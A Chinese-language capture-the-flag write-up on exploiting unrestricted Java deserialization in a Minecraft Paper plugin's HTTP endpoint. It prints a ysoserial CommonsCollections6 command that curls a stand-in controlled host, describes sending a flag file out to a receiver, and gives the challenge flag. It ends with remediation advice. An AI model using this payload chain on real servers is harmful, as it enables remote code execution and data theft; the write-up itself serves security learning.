# LPMC

## 题目简述

题目提供 Minecraft Paper 1.8.8 插件，并在端口 8081 暴露一个外部赠送钻石接口。插件把请求中的 Base64 字段交给 Java `ObjectInputStream`，攻击者可借 classpath 中可用的 gadget chain 实现远程命令执行。

## 解题过程

用 JADX 反编译插件 JAR，可见 `/givediamond` 用于发放钻石，`/gendiamondb64` 能生成序列化的 `PacketGiveDiamond`。HTTP `/give` 接口要求：

```http
Content-Type: application/json
X-API-Key: change_this_to_a_secure_key
```

JSON 的 `serialization_data` 字段会被 Base64 解码并送入 `ObjectInputStream.readObject()`，且没有类型白名单。对题目给定依赖测试 ysoserial gadget 后，`CommonsCollections6` 可用。先用无害回连确认：

```bash
java -jar ysoserial-all.jar CommonsCollections6 \
  'curl https://your-controlled-endpoint.example/test' | base64 -w0
```

把结果放入请求：

```json
{"serialization_data":"<base64 payload>"}
```

确认执行后，将命令改为读取 `/app/lpmc-server/flag.txt` 并送往受控接收端，取得：

```text
grey{h3YyYYyY_pr0_d3ser1aliz3R_al3r7!!!}
```

正文不保留官方示例中的临时 webhook UUID；它只是一次性接收端，复现时应替换为自己的地址。

## 方法总结

Java 原生反序列化的可利用性取决于服务器 classpath，因此应在题目指定的 Paper 版本与插件依赖下测试 gadget，不能假设所有 ysoserial 链都可用。API key 只是静态配置泄漏，真正的执行原语来自不受限的 `ObjectInputStream`。修复应改用普通 JSON DTO、严格字段校验，并彻底移除对客户端序列化对象的反序列化。
